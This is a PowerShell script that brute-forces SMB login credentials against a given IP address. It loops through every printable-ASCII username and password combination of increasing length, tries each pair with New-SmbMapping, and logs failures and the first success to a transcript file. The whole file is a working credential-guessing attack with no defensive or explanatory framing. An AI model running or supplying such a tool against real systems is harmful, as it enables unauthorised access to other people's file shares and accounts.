param ($IPAddr = $(throw "Need IP Address"))
# TODO: Add params for Max Length etc.

# TODO: Add output file types XML, TXT, EXCEL
Start-Transcript -path output.txt # TODO: Add timestamp

# TODO: Just checks ASCII since the letters are the most used, for more Unicode values a parameter can be added
$LastASCIINum = 126 
$FirstASCIINum = 33
$MaxLength = 1 
$OldMaxLength = 0
$MaxLengthInc = 1 # Incrementation value to update the maximum length for username and password

# Usernames can not contain   / \ [ ] : ; | = , + * ? < > %
$avoid =  34, 47, 92, 91, 93, 58, 59, 124, 61, 44, 43, 42, 63, 60, 62, 37

function updateList{
param ([int[]]$list, [bool] $isUsername)

for ($i = $list.Length-1; $i -ge 0 ; $i--){
    $list[$i] ++

    if ( $isUsername -and $avoid -contains $list[$i]){
        $i++ #process again
    }
    elseIf ($list[$i] -eq 1 ){ #if it was null
        $list[$i] = $FirstASCIINum - 1
    }
    elseIf ( $list[$i] -gt $LastASCIINum ){
        if ($i -ne 0 ){
            $list[$i] = $FirstASCIINum
        }
        else{
            [int[]]$list2 = ,$FirstASCIINum * ($list.Length+1)  # Increase the length and continue
            return $list2
        }
    }
    else {
        break
    }
}
return $list
}

function createString{
param ([int[]]$list)
$out = $null;
   for ($i = 0; $i -lt $list.Length ; $i++){
       $out+=[char]$list[$i] # display as an ASCII character
   }
   return $out
}

function brute {

[int[]]$userPtr =  $FirstASCIINum # username can not be space
[int[]]$passPtr =  0 # password can be null
$user = createString $userPtr #changes to String
$pass = createString $passPtr #changes to String
$Result = $null

#Continue till find a match
:outer while ($true) {

while ($userPtr.Length -le $MaxLength) {

    while ($passPtr.Length -le $MaxLength){ #check pass for this user
        $Result = New-SmbMapping -RemotePath $IPAddr -UserName $user -Password $pass -EA SilentlyContinue
           # TODO: Check if the server is on
        if ( $Result -ne $null ){
            Write-Host "SUCCESS -> UserPtr: " $userPtr "User:" $user "PassPtr: " $passPtr "Pass:" $pass
            break outer
        }
        Write-Host "FAILED -> UserPtr: " $userPtr "User:" $user "PassPtr: " $passPtr "Pass:" $pass
        $passPtr = updateList $passPtr $false
        $pass = createString $passPtr
    }
    $userPtr = updateList $userPtr $true
    $user = createString $userPtr 
    if ( $OldMaxLength -eq 0 -or $userPtr.Length -gt $OldMaxLength) {
        $passPtr =  0 # needs to start from the beginning
    }
    else {
        $passPtr =   @($FirstASCIINum) * ($OldMaxLength+1)
    }
    $pass = createString $passPtr
}
$OldMaxLength = $MaxLength
$MaxLength += $MaxLengthInc
$userPtr = $FirstASCIINum
$user = createString $userPtr
$passPtr =  @($FirstASCIINum) * ($OldMaxLength+1) # No need to check previous with the same usernames, no need to check null anymore since there are other characters
$pass = createString $passPtr
}
}

brute
Stop-Transcript
